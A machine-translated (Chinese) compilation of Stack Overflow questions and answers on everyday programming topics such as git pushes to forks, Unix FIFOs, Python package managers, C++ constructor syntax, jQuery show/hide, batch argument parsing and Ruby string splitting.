> 赞同：0
> 
> 时间：2016-03-21T10:52:58.103

在android中同时使用水平和垂直scoolview的最佳解决方案

```
 <HorizontalScrollView
            android:layout_width="match_parent"
            android:layout_height="fill_parent"
            android:layout_below="@+id/seatLegendLayout">

            <FrameLayout
                android:layout_width="fill_parent"
                android:layout_height="match_parent">

                <LinearLayout
                    android:id="@+id/linearLayout_gridtableLayout"
                    android:layout_width="900dp"
                    android:layout_height="match_parent"
                    android:orientation="horizontal">

                    <GridView
                        android:id="@+id/gridView1"
                        android:layout_width="fill_parent"
                        android:layout_height="fill_parent"
                        android:layout_margin="4dp"
                        android:columnWidth="100dp"
                        android:gravity="center"
                        android:numColumns="9"
                        android:horizontalSpacing="1dp"
                        android:scrollbarAlwaysDrawHorizontalTrack="true"
                        android:scrollbarAlwaysDrawVerticalTrack="true"
                        android:scrollbars="horizontal"
                        android:stretchMode="none"
                        android:verticalSpacing="1dp">

                    </GridView>

                </LinearLayout>
            </FrameLayout>
        </HorizontalScrollView> 
```

# ruby-on-rails - 对于 Ruby on Rails 项目拉取请求，git push to my fork 失败

> ID：13537894
> 
> 赞同：0
> 
> 时间：2012-11-24T03:09:16.500
> 
> 标签：ruby-on-rails, git, github, git-push, ruby-on-rails-4

我进行了修复和测试，`git commit -a`更新了我的分支，现在我正在尝试推送到我之前制作的 GitHub 分支：

```
vagrant@rails-dev-box:~/rails$ git push mine my_fix
Username for 'https://github.com': myusername
Password for 'https://myusername@github.com':
To https://github.com/myusername/rails.git
 ! [rejected]        my_fix -> my_fix (non-fast-forward)
error: failed to push some refs to 'https://github.com/myusername/rails.git'
To prevent you from losing history, non-fast-forward updates were rejected
Merge the remote changes (e.g. 'git pull') before pushing again.  See the
'Note about fast-forwards' section of 'git push --help' for details. 
```

我猜这个问题的原因是分叉有点过时（可能是一个星期）。尽管我不想输，但我已经做出了其他推动。我在这里做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T03:53:36.487

我认为您的分支不是最新的，因此您需要提取最近的更改，然后将更改推送到远程。

```
 $git pull --rebase branch_path
    $git push remote_name branch_name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T03:48:33.367

您的（Github）分支对上游更改**一无所知**

消息说明清楚

> 合并远程更改

即 - 在您的 Github 存储库中，您**有变更集**，**它们不在本地**存储库中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T09:57:56.953

在`master`本地分支上：

1.  您需要添加 rails/rails 作为上游： `git remote add upstream git://github.com/rails/rails.git`
2.  现在，使用 rebase 拉动（而不是使用合并，因为如果你 rebase 会更容易跟上 rails/rails 上的更新） `git pull --rebase upstream master`
3.  将更改推送到您的主服务器（您将需要强制推送，但要小心并确保您对更改没问题，因为在此操作后之前的更改将更难恢复） `git push --force origin master`

# unix - Unix cat 命令和 FIFO

> ID：13537896
> 
> 赞同：0
> 
> 时间：2012-11-24T03:09:39.857
> 
> 标签：unix, console

我在理解此命令时遇到问题：在终端执行`mkfifo pipe1`并`mkfifo pipe2` 执行后：

1.  `$ echo -n x | cat - pipe1 > pipe2 &`

    结果我得到：

    ```
    [1] 3526 
    ```

    随着时间的推移往往会增加的数字。

    当我运行时：

2.  `$ cat <pipe2 > pipe1`

    输出是：

    ```
    $ echo -n x | cat - pipe1 > pipe2 & 
    ```

有人可以解释发生了什么吗？

1.  据我所知，第一个命令应该在 pipe2 上创建一个包含 x + pipe1 内容的新文件，那么输出是什么，如果 pipe2 已经存在，因为是用 mkfifo 创建的，那么应该发生什么？
2.  我不知道第二个命令是做什么的。我在网上找不到任何参考资料。

这是作业，我们还没有看到课；任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T03:45:49.043

每个命令：

```
echo -n x | cat - pipe1 > pipe2 & 
```

运行命令序列，以便将 的输出通过`echo`管道传送到，`cat`但该序列在后台运行。shell 会生成一条消息，例如：

```
[1] 3526 
```

表示后台作业是 jobid 1 和进程 ID 3526。由于 FIFO 的性质，整个子 shell 被挂起，等待打开`pipe2`读取的内容，然后才能成功启动`cat`操作。一旦发布，该`cat`命令从标准输入读取一个字符，然后挂起等待来自`pipe1`. 严格地说，这意味着它等待一个进程打开`pipe2`以进行写入。

当您重复该命令时，数字会增加，因为作业编号和进程 ID 是唯一的。

其`cat pipe1`本身应该挂起。回显的命令可能来自之前完成的某个命令。

```
$ echo -n x | cat - pipe1 > pipe2 &
[1] 9304
$ (echo Hi > pipe1) &
[2] 9305
$ sleep 3
$ jobs
[1]-  Running                 echo -n x | cat - pipe1 > pipe2 &
[2]+  Running                 ( echo Hi > pipe1 ) &
$ cat pipe2
-n x
Hi
[1]-  Done                    echo -n x | cat - pipe1 > pipe2
[2]+  Done                    ( echo Hi > pipe1 )
$ 
```

我的外壳（Korn）`echo -n`与您的外壳（可能`bash`）不同。

# pagination - CodeIgniter 分页链接 URL 生成行为

> ID：13537897
> 
> 赞同：0
> 
> 时间：2012-11-24T03:09:55.677
> 
> 标签：pagination, hyperlink, codeigniter-2

起初我以为我做错了什么并且链接生成不正确，但对我来说内容按预期显示很奇怪，所以我做了一些搜索，发现 CI 的分页链接 URL 实际上包含偏移量而不是页码。现在，虽然这对于从数据库中获取内容很方便，但在查看 URL 本身时，我发现它非常不直观。例如，如果我要显示 9 个对象，每页 3 个对象，我将有 3 个页面，第 2 页和第 3 页的链接将分别为 url/3 和 url/6。

有没有办法让分页生成带有实际页面而不是偏移量的 URL？我可以使用 page 和 per_page 信息轻松计算偏移量。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T06:33:59.370

您可以自定义分页。有一个选项可用

```
$config['use_page_numbers'] = TRUE; 
```

如果将其设置为 true，它将生成页码。

您可以在此处阅读文档

用户指南

# hadoop - 关于 Pig job Jar fie

> ID：13537898
> 
> 赞同：2
> 
> 时间：2012-11-24T03:09:56.033
> 
> 标签：hadoop, apache-pig

我正在使用嵌入式 Pig 来实现图形算法。它在本地模式下工作正常。但是在完全分布式的 Hadoop 集群中，总是会出现如下错误信息：（请看最后几行）

```
2012-11-23 22:00:00,651 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.JobControlCompiler - creating jar file Job4116346741117365374.jar
2012-11-23 22:00:09,418 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.JobControlCompiler - jar file Job4116346741117365374.jar created
2012-11-23 22:00:09,423 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.JobControlCompiler - Setting up multi store job
2012-11-23 22:00:09,431 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.JobControlCompiler - BytesPerReducer=1000000000 maxReducers=999 totalInputFileSize=296
2012-11-23 22:00:09,431 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.JobControlCompiler - Neither PARALLEL nor default parallelism is set for this job. Setting number of reducers to 1
2012-11-23 22:00:09,442 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.MapReduceLauncher - 1 map-reduce job(s) waiting for submission.
2012-11-23 22:00:09,949 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.MapReduceLauncher - job null has failed! Stop running all dependent jobs
2012-11-23 22:00:09,949 [main] INFO org.apache.pig.backend.hadoop.executionengine.mapReduceLayer.MapReduceLauncher - 100% complete
2012-11-23 22:00:09,992 [main] ERROR org.apache.pig.tools.pigstats.SimplePigStats - ERROR 6015: During execution, encountered a Hadoop error.
2012-11-23 22:00:09,993 [main] ERROR org.apache.pig.tools.pigstats.PigStatsUtil - 1 map reduce job(s) failed!
2012-11-23 22:00:09,994 [main] INFO org.apache.pig.tools.pigstats.SimplePigStats - Script Statistics:

HadoopVersion    PigVersion    UserId    StartedAt    FinishedAt Features
0.20.1    0.10.0    jierus    2012-11-23 21:52:38    2012-11-23 22:00:09    HASH_JOIN,GROUP_BY,DISTINCT,FILTER,UNION

Some jobs have failed! Stop running all dependent jobs
Failed Jobs:
JobId    Alias    Feature    Message    Outputs
N/A    vec_comp,vec_comp_final,vec_comp_tmp HASH_JOIN,MULTI_QUERY    Message: java.io.FileNotFoundException: File /tmp/Job4116346741117365374.jar does not exist.
    at org.apache.hadoop.fs.RawLocalFileSystem.getFileStatus(RawLocalFileSystem.java:361)
    at org.apache.hadoop.fs.FilterFileSystem.getFileStatus(FilterFileSystem.java:245)
    at org.apache.hadoop.fs.FileUtil.copy(FileUtil.java:192)
    at org.apache.hadoop.fs.FileSystem.copyFromLocalFile(FileSystem.java:1184)
    at org.apache.hadoop.fs.FileSystem.copyFromLocalFile(FileSystem.java:1160)
    at org.apache.hadoop.fs.FileSystem.copyFromLocalFile(FileSystem.java:1132) 
```

有人知道我的代码或操作的哪一部分是错误的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-17T06:01:38.220

闻起来就像您没有为 pig 指定作业跟踪器（仅指定 hdfs 是不够的！）。例如

```
<property>
    <name>mapred.job.tracker</name>
    <value>10.xx.xx.99:9001</value>
</property> 
```

# python - 相当于 npm 或 ruby gems 的 Python

> ID：13537901
> 
> 赞同：71
> 
> 时间：2012-11-24T03:10:41.977
> 
> 标签：python, rubygems, npm

我一直在寻找可以与 python 一起使用的包管理器。我想在文件中列出项目依赖项。例如，ruby 使用 Gemfile，您可以在其中使用 bundle install。我怎样才能在python中实现这一点？

* * *

## 回答 #1

> 赞同：85
> 
> 时间：2012-11-24T03:28:38.463

该`pip`工具正在成为相当于 Ruby 的 gems 的标准。Like `distribute`，`pip`使用[PyPI](http://pypi.python.org/pypi)包存储库（默认情况下）来解析和下载依赖项。`pip`可以从列出项目依赖项的文件中安装依赖项（`requirements.txt`按约定调用）：

```
pip install -r requirements.txt 
```

您也可以使用 pip “冻结” Python 路径上的当前包：

```
pip freeze > requirements.txt 
```

与包结合使用时`virtualenv`，您可以可靠地创建具有项目所需依赖项的项目 Python 环境。

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2017-09-03T06:10:47.463

# Pipenv

（我知道这是一个老问题，它已经有了答案，但对于像我这样来这里寻找不同答案的人来说。）

我找到了一个**非常好的 npm 等价物**，它叫做[**pipenv**](https://github.com/kennethreitz/pipenv)。它同时处理**virtualenv 和 pip 要求，**因此它更像 npm。

* * *

### 简单用例

```
pip install pipenv 
```

然后你可以用第三版python制作一个新的virtualenv，以及制作一个**pipfile**来填充你的项目需求和其他东西：

```
pipenv install --three 
```

使用您创建的 virtualenv：

```
pipenv shell 
```

安装一个新的 python 包：

```
pipenv install requests 
```

运行你的 .py 文件就像：

```
pipenv run python somefile.py 
```

[你可以在这里](https://pipenv.kennethreitz.org/en/latest/)找到它的文档。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-09-09T17:21:34.330

Python`pip`用于包管理器。该`pip install`命令具有`-r <file>`从指定的需求文件安装软件包的选项。

安装命令：

```
pip install -r requirements.txt 
```

示例`requirements.txt`内容：

```
Foo >= 1.2
PickyThing <1.6,>1.9,!=1.9.6,<2.0a0,==2.4c1
SomethingWhoseVersionIDontCareAbout 
```

有关格式的完整描述，请参阅文档的需求解析部分：[https ://pip.pypa.io/en/stable/user_guide/#requirements-files](https://pip.pypa.io/en/stable/user_guide/#requirements-files)

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2018-06-08T23:36:21.760

这就是我将`pip`' 的范围限制在当前项目中的方式。如果您来自 NodeJS`npm`或 PHP ，您使用or`composer`明确指定全局安装，则感觉正好相反。`-g``--global`

如果您尚未`virtualenv`安装，请使用以下命令全局安装：

```
 pip install virtualenv 
```

每个 Python 项目都应该有自己的`virtualenv`安装。设置一个很容易，只需`cd`到您项目的根目录，并且：

```
 python3 -m virtualenv env  # creates env folder with everything you need 
```

激活虚拟环境：

```
 source env/bin/activate 
```

现在，任何交互`pip`都包含在您的项目中。

`pip install package_name==version`为每个依赖项运行。它们安装在`./env/lib/python3.x/site-packages/`

如果要将项目的依赖项保存到文件中，请运行：

```
 pip freeze > requirements.txt 
```

你实际上不需要`-l`或者`--local`如果你在一个激活的项目特定的 virtualenv 中（你应该是）。

现在，当您想从 安装依赖项时`requirements.txt`，设置您的 virtualenv，然后运行：

```
 pip install -r requirements.txt 
```

就这样。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2021-11-20T15:45:24.010

这是`pipenv`vs `poetry`vs的比较`pdm`：[https](https://dev.to/frostming/a-review-pipenv-vs-poetry-vs-pdm-39b4) ://dev.to/frostming/a-review-pipenv-vs-poetry-vs-pdm-39b4 结论是`pdm`胜利者。

但根据我的经验，`poetry`这比`pdm`与 IDE 集成要容易。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-10-04T21:42:00.610

这是一个古老的问题，但事情在不断发展。

进一步关于其他答案`pipenv`。还有一个名为`poetry`.

`pipenv`和这里有一个详细的比较`poerty`：[npm、pip、pipenv 和诗歌包管理器之间的特性比较](https://stackoverflow.com/questions/58218592/feature-comparison-between-npm-pip-pipenv-and-poetry-package-managers)。它还将功能链接到常见`npm`功能。

# c++ - 构造函数在 main 中调用，但对象未正确创建

> ID：13537904
> 
> 赞同：0
> 
> 时间：2012-11-24T03:10:53.130
> 
> 标签：c++, constructor, output

我试图调用构造函数 H，但由于某种原因它没有被调用。编译代码时没有错误，并且得到输出：

> 初始化的对象。
> 
> H 对象已初始化。

如果 H 已正确初始化，则还应显示来自构造函数的 cout。

有人可以帮忙吗？谢谢你。

我还有一个问题。如何更改 hVec[i].a 的值并使 aArray[i].a 的值也采用该值？我知道我想使用指针，但很困惑。抱歉有这些问题; 我对 C++ 编程比较陌生。

```
#include <vector>
#include <iostream>

struct A
{
  A(int av):a(av){}

    int a;
};

struct Heap
{

  Heap(std::vector<A> hVal)
  {
      std::cout << "Constructor for H object. \n";
      for (int i=0; i<hVal.size(); ++i) 
      {
          hVec.push_back(hVal[i]);
          std::cout << "hVec[i].a = " << hVec[i].a << "   ";
      }
      std::cout << std::endl;
  }

  std::vector<A> hVec;
};

int main()
{
  A a0(2), a1(4), a2(8);  
  std::vector<A> aArray;  
  aArray.push_back(a0);
  aArray.push_back(a1);
  aArray.push_back(a2);         
  std::cout << "A object initialized. \n";

  Heap h(A);

  std::cout << "H object initialized. \n";

  return 0;

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:17:19.490

您`struct Heap`没有`A`作为参数的构造函数。

`std::vector<A>`但是，您可以使用类型为 aArray 来初始化 h

```
Heap h(aArray); 
```

在 C++ 中，除非您试图与 C 兼容，否则只需使用`class`而不是`struct`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T03:18:16.840

```
Heap h(A); 
```

这声明了一个`Heap(A)`名为的函数`h`。也许你的意思是：

```
Heap h(aArray); 
```

`Heap`这声明了一个名为的局部变量`h`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T03:20:06.267

使用`Heap h(aArray);`而不是`Heap h(A);`

该行`Heap h(A);`声明了一个`h`以类型对象`A`为参数的函数，并返回一个对象`Heap`。

# jquery - .show .hide functions not working 代码中的错误可能

> ID：13537908
> 
> 赞同：0
> 
> 时间：2012-11-24T03:11:28.747
> 
> 标签：jquery, click, hide, show

```
$(document).ready(function() {  
    $("#light").hide();  
    $('.createmessage').click(function() {  
        $('#light').show();    
    });
    $('#fade').click(function() {
        $('#light').hide();
    });
    $('.cancelButton').click(function() {
        $('#light').hide();
    });
}); 
```

这就是我正在研究的 jQuery，我很确定有些地方出了问题。1 它看起来不正确，并且两个代码不起作用。

这里的 jsfiddle 链接 [http://jsfiddle.net/6aNL5/](http://jsfiddle.net/6aNL5/)

如果有人可以解释我做错了什么，请务必。我喜欢学习，我想这对我来说只是练习。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T03:23:27.183

我修复了按钮，所以当它被点击时，对话框像以前一样出现，但现在取消回到页面的原始视图。这是用于此的 jsfiddle：http: [//jsfiddle.net/6aNL5/1/](http://jsfiddle.net/6aNL5/1/)

```
$(document).ready(function() {  
    $("#light").hide();  
    $('.createmessage').click(function() {  
        $('#light').show();    
    })
    $('#fade').click(function() {
        $('#light').hide();
    });
    $('.cancelButton').click(function() {
        $('#light').hide();
        $('#fade').hide();
    });
}); 
```

据我所知，这使它工作（至少在我们可以在 jsfiddle 上尝试的路径上）。它看起来像应该的吗？​</p>

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:28:39.767

jsfiddle 设置为使用 Mootools，所以这可能就是那里没有任何工作的原因。除此之外，我认为这里的问题是代码草率。您不需要在 HTML 中附加事件侦听器。因此，例如，而不是：

```
<span class="createMessage" onclick = "document.getElementById('light').style.display='block';document.getElementById('fade').style.display='block'"> 
```

在 JavaScript 中执行此操作：

```
$(document).ready(function() {  
    $("#light").hide();  
    $('.createMessage').click(function() { // This was misspelt before
        $('#light').show(); 
        $('#fade').show();
    });
    $('#fade').click(function() {
        $('#light').hide();
    });
    $('.cancelButton').click(function() {
        $('#light').hide();
        $('#fade').hide();
    });
}); 
```

`.show()`并且无论如何`.fade()`都简单地切换属性。`display`现在，您将 HTML 结构与交互式 JavaScript 分离，这使得调试更加容易。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T03:44:21.913

jsfiddle 中的 html 代码正在生成，所以我们必须添加两个 .hide 或两个 .show。所以我将它们包装在一个 div 中。像这样

```
<span class="createMessage">
    <span>Create Message</span>
</span>
<div id="messagePop" class="messagePopper">
    <div id="light" class="white_content">
        <div class="topborder"><span>NewMessage</span></div>
        <div class="formbody">
            <form id="privatemessage" action="/privmsg" method="post" name="post" class="newmessage">
                <input placeholder="Message To:" name="username[]" onfocus="if(this.value == 'Message To:'){this.value = '';}" type="text" onblur="if(this.value == ''){this.value='Message To:';}" class="usernameinput">
                <input required placeholder="Subject:" onkeypress="if (event.keyCode==13){return false}" maxlength="64" name="subject" onfocus="if(this.value == 'Subject:'){this.value = '';}" onblur="if(this.value == ''){this.value='Subject:';}" type="text" class="usernameinput"/>
                <textarea class="noThis" name="message"  onfocus="if(this.value == 'Type your message here'){this.value = '';}" onblur="if(this.value == ''){this.value='Type your message here';}" >Type your message here</textarea>
        </div>
        <div id="bottombuttons">
            <span class="button"><input type="submit" value="Submit" name="post" class="submitbutton uiButton uiButtonConfirm uiButtonLarge">
            </form> 
            &nbsp;&nbsp;<button class="submitbutton cancelButton uiButton uiButtonConfirm uiButtonLarge">Cancel</button></span>
        </div> 
    </div>          
    <div id="fade" class="black_overlay"></div>
</div> 
```

像这样的jQuery：

```
$(document).ready(function() {  
      $("#messagePop").hide();  
      $('.createMessage').click(function() {  
          $('#messagePop').show();    
      });
      $('#fade').click(function() {
          $('#messagePop').hide();
      });
      $('.cancelButton').click(function() {
          $('#messagePop').hide();
      });
}); 
```

​ 在大家的帮助下，我意识到我是一个多么愚蠢的人，我正在纠正自己。并想向大家展示。

[http://jsfiddle.net/6aNL5/3/](http://jsfiddle.net/6aNL5/3/)

# input - 如何读取批处理脚本的输入参数中的特定数字

> ID：13537911
> 
> 赞同：1
> 
> 时间：2012-11-24T03:11:47.530
> 
> 标签：input, batch-file, digit

我有一个批处理脚本，我在其中设置了一个变量 - “cpu-count”，它的默认值设置为 1。但是当我调用批处理脚本时，cpu-count 作为参数传递，它的值可以从1-n。例如，我必须将文件调用为“myscript.bat cpucount-4”或“myscript.bat cpucount-7”。我必须在我的脚本中得到这个值“4”或“7”。有谁知道如何从传递给批处理脚本的参数中读取这个值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T03:44:39.650

你有几个选择来做到这一点。

从字符 10 到字符串结尾：

```
set value=%1
set value=%value:~9% 
```

从值的开头删除直到破折号：

```
set value=%1
set value=%value:*-=% 
```

在破折号处将值分成两部分，得到第二部分：

```
for /F "tokens=2 delims=-" %%a in ("%1") do set value=%%a 
```

我希望它有帮助...

# c - 反向打印字符串值

> ID：13537912
> 
> 赞同：1
> 
> 时间：2012-11-24T03:11:48.233
> 
> 标签：c, string, printing, reverse

当我尝试以相反的顺序打印字符串值时，我的控制台屏幕中出现空白输出。如果我使用 for 循环打印字符串值正在打印，但是当我简单地使用 %s 打印时，它没有打印？为什么？

```
#include <stdio.h>
#include <conio.h>
#include <string.h>

void main()
{
    char name1[10],name2[10];
    int i,len,j;

    clrscr();

    printf("\nEnter the string that u want to get reversed:");
    scanf("%s",&name1);
    for(i=0;name1[i]!='\0';i++);
    len=i;

    j=i;

    for(i=0;i<=len;i++)
    {
        name2[i]=name1[j];
        j--;
    }

    printf("\nThe reversed string is:");
    printf("%s",name2);
    getch();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T03:16:50.720

您通过将原始的 nullchar 终止符作为第一个字符来开始反转字符串。因此，就其`printf()`而言，它是一个空字符串（零长度）。

除此之外，这需要*认真的*代码审查。老实说，这不是适合它的地方，因为对正确参数的审查可能会重写整个事情（除了开头`scanf()`和结尾`printf()`。我**强烈**建议您在调试器中逐步运行此程序，以查看发生了什么作为您的代码运行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T03:55:35.623

给你一些注意事项：

*   在发布之前正确格式化您的代码

*   您使用了太多“printf”来查看变量值。这意味着你不知道如何正确调试你的代码请谷歌如何调试代码+“你正在使用的 IDE 名称”（fe.如何调试代码视觉工作室）

*   总是在你的代码中添加注释

*   在发布类似的内容之前，请先 GOOGLE！“反转字符串”问题是典型的“编程入门”作业，不难找到示例代码。一开始学习代码比随便输入一些废话更有用

*   你应该给你的变量更有意义的名字fe在你的情况下'src'和'target'是比name1和name2更好的选择当然在这么短的代码中它并不重要但尽快习惯它

*   尝试在开始编码之前先在纸上解决此类问题以进行可视化
*   由于您尝试通过读取用户的输入来处理动态字符串内容，因此使用动态分配（即 malloc()/free()）比使用修复数组更好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-24T03:18:41.190

您始终可以只使用标准 string.h 库中的 strrev 函数

# php - 操作文本框并动态显示它？

> ID：13537915
> 
> 赞同：2
> 
> 时间：2012-11-24T03:12:22.490
> 
> 标签：php, mysql, textbox

我想创建一个texbox的动态数字显示，会有一个文本框和一个提交按钮，然后我的第一个文本框的数值也应该显示文本框的数量。这将允许我在我的数据库中输入我的记录。我正在为我的数据库使用 MySQL，如果我的文本框的第一组记录与第二组不同，我将如何将记录插入到我的表中（例如，我在第一个文本框中输入 3，然后将出现三个文本框和一个提交按钮，在我的第二组记录中，我决定在第一个文本框上有 6 个，然后页面中将出现 6 个文本框）我的问题再次我将如何做到这一点？

如果我曾经使用数组来获取记录和索引我的动态文本框的值，我应该使用什么类型的数组呢？我将如何动态命名文本框的值？最后，我想要的限制也将设置文本框的最大数量。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T03:38:00.453

好的。多个文本框，我们称它们为列。用户在每一行中输入的第一条记录是他们需要的列数。提交按钮只会调用一个 javascript 函数来为页面上的该行创建所需数量的列。这将限制可以创建多少个，如果用户知道如何作弊，PHP 也会忽略额外的内容。

跳到你的最后一个问题（因为第二个问题需要这个信息）。您已经决定了最大列数是多少，所以如果该数字不大，最简单的方法就是创建一个可以满足那么多列的表。某些字段在某些行上为 NULL。

当您想要插入时，列数不同并不重要，因为对于每一行，您期望达到一定数量并且只处理给定的值，那些缺失的是 NULL。当你输出它们时，你只输出那些不是 NULL 的。

抱歉，关于在获取记录和索引中使用数组的内容对我来说没有意义，但我怀疑您正在寻找使用什么 php 数据库类从数据库中取回数据？我认为趋势是mysqli。我个人使用定制的。

# java - Android Final vs Private textviews

> ID：13537916
> 
> 赞同：9
> 
> 时间：2012-11-24T03:12:46.357
> 
> 标签：java, android, final

简单也许愚蠢的问题。我有一个登录活动，它启动另一个活动，这是代码：

```
public class LoginActivity extends Activity {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.login);
    ActionBar actionBar = getActionBar();
    actionBar.hide();

    Button btnLogin = (Button) findViewById(R.id.btnLogin);
    final TextView tvUsername = (TextView) findViewById(R.id.tvUsername);
    final TextView tvPassword = (TextView) findViewById(R.id.tvPassword);

    btnLogin.setOnClickListener(new View.OnClickListener() {

        @Override
        public void onClick(View v) {
            if (tvUsername.getText().toString().length()<1) {
                Toast msg = Toast.makeText(LoginActivity.this, "Enter a Username", Toast.LENGTH_LONG);
                msg.setGravity(Gravity.TOP|Gravity.LEFT, 0, 70);
                msg.show();
                tvUsername.requestFocus();
            } else if (tvPassword.getText().toString().length()<1) {
                Toast msg = Toast.makeText(LoginActivity.this, "Enter a Password", Toast.LENGTH_LONG);
                msg.setGravity(Gravity.TOP|Gravity.LEFT, 0, 200);
                msg.show();
                tvPassword.requestFocus();
            } else {
                startActivity(new Intent(LoginActivity.this,CrewScheduleActivity.class));
                finish();
            }
        }
    });
    }
} 
```

我的问题是关于文本视图。Eclipse 基本上说我必须使它们最终化才能在按钮的 onClick 事件中使用它们。NP所以我这样做了，它奏效了。

问题是将这些放在@Override 之上作为私有与在 OnCreate 中作为最终有什么区别？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-24T03:35:13.303

这与[Java 中的闭包有关](http://en.wikipedia.org/wiki/Closure_%28computer_science%29#Local_classes_.28Java.29)。基本上，当您使用匿名类时，其中使用的值（不是对象本身）被复制到该类以供使用。因此，在类中返回或修改这些变量是没有意义的，因此它们必须是`final`.

但是，如果变量是*包含*匿名类的类的一部分，那就不同了。基本上，您的内部类具有对`LoginActivity`对象的引用（as `LoginActivity.this`），并且可以使用和修改其成员和方法。

当您将它们放在“@Override 之上”时，您就是在使它们成为`LoginActivity`类的成员变量。因此，它们可以被匿名类访问。

简而言之，区别在于：`final`变量是方法本地的，并且复制到匿名类中；成员变量是包含类的本地变量，并由匿名类修改。

如果您想稍后重用来自匿名类的数据，请使用成员变量。如果您只需要在`onCreate()`匿名类中使用它，那么一个`final`变量就足够了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T03:37:07.440

当您将 TextView 字段（或与此相关的任何字段）声明为公共时，任何其他类都可以直接访问它，我认为这不是您的意图；没有理由公开 TextView 变量。
如果它被设置为私有，则可以保证它的值不会在另一个类中被覆盖，这就是**final**关键字最初的设计目的。因此，只需将其设置为私有，您就不必担心 Eclipse 会纠正您。
因此，总而言之：使字段私有/最终确保该值不能被另一个类覆盖，这是一个很好的设计。

希望这种漫无边际的帮助。如果没有，我会很高兴更好地澄清它。

# ruby - Ruby 被空格分割

> ID：13537920
> 
> 赞同：50
> 
> 时间：2012-11-24T03:13:36.287
> 
> 标签：ruby, split, whitespace

如何编写一个 Ruby 函数，通过任何类型的空格分割输入，并从结果中删除所有空格？例如，如果输入是

```
 aa bbb
cc    dd ee 
```

然后返回一个数组`["aa", "bbb", "cc", "dd", "ee"]`。

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2014-08-01T19:38:56.577

这是 的默认行为[`String#split`](http://www.ruby-doc.org/core-2.1.2/String.html#method-i-split)：

```
input = <<-TEXT
 aa bbb
cc    dd ee
TEXT

input.split 
```

结果：

```
["aa", "bbb", "cc", "dd", "ee"] 
```

这适用于我测试的所有 Ruby 版本，包括 1.8.7、1.9.3、2.0.0 和 2.1.2。

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2012-11-24T03:28:41.500

以下应该适用于您提供的示例：

```
str.gsub(/\s+/m, ' ').strip.split(" ") 
```

它返回：

```
["aa", "bbb", "cc", "dd", "ee"] 
```

代码含义：

`/\s+/m`是更复杂的部分。`\s`表示空白，因此`\s+`表示一个或多个空白字母。在该`/m`部分中，`m`称为修饰符，在这种情况下，它表示*multiline*，表示访问多行，而不仅仅是默认行为。所以，`/\s+/m`意味着，找到一个或多个空格的序列。

`gsub`表示全部替换。

`strip`相当于`trim`其他语言中的 ，并从字符串的开头和结尾删除空格。

因为，我正在写解释，这可能是你在字符串的末尾或开头以结尾字符结尾的情况。

**为了安全**

代码可以写成：

```
str.gsub(/\s+/m, ' ').gsub(/^\s+|\s+$/m, '').split(" ") 
```

所以如果你有：

```
str = "\n     aa bbb\n    cc    dd ee\n\n" 
```

然后你会得到：

```
["aa", "bbb", "cc", "dd", "ee"] 
```

新代码的含义：

`^\s+`字符串开头的一系列空格

`\s+$`字符串末尾的一系列空格

所以`gsub(/^\s+|\s+$/m, '')`意味着删除字符串开头和字符串结尾的任何空格序列。

* * *

## 回答 #3

> 赞同：24
> 
> 时间：2012-11-24T04:07:43.533

```
input = <<X
     aa bbb
cc    dd ee
X

input.strip.split(/\s+/) 
```

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2013-05-01T12:11:46.040

```
input.split("\s") 
```

如果`"\s"`使用 代替`/\s/`，则会从结果中删除空格。

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2014-08-01T19:24:14.653

作为对 Vidaica 答案的轻微修改，在 Ruby 2.1.1 中，它看起来像

```
input.split(" ") 
```

将补偿所有空格，无论是空格、制表符还是换行符，产生：

```
["aa", "bbb", "cc", "dd", "ee"] 
```

# cuda - MCUDA安装说明

> ID：13537922
> 
> 赞同：0
> 
> 时间：2012-11-24T03:14:23.777
> 
> 标签：cuda

MCUDA 软件包附带的网站和 README 文件没有提供有关如何安装它的说明，我遇到了问题。我根本不知道“MCUDA 的库和最终源代码编译器”指的是什么。

```
# 安装.sh
所需的 MCUDA 安装路径（附加 /MCUDA）：/usr/local
现有CUDA安装目录路径：/usr/local/cuda/
MCUDA 库的选择（omp/pthread/serial）：
MCUDA 的库和最终源代码编译器：

确认设置参数..........................
MCUDA 将安装到：/usr/local
CUDA 安装在：/usr/local/cuda/
MCUDA 库实现：
MCUDA 库和应用程序编译器的路径：
确认（是/否）：是
正在验证设置参数...
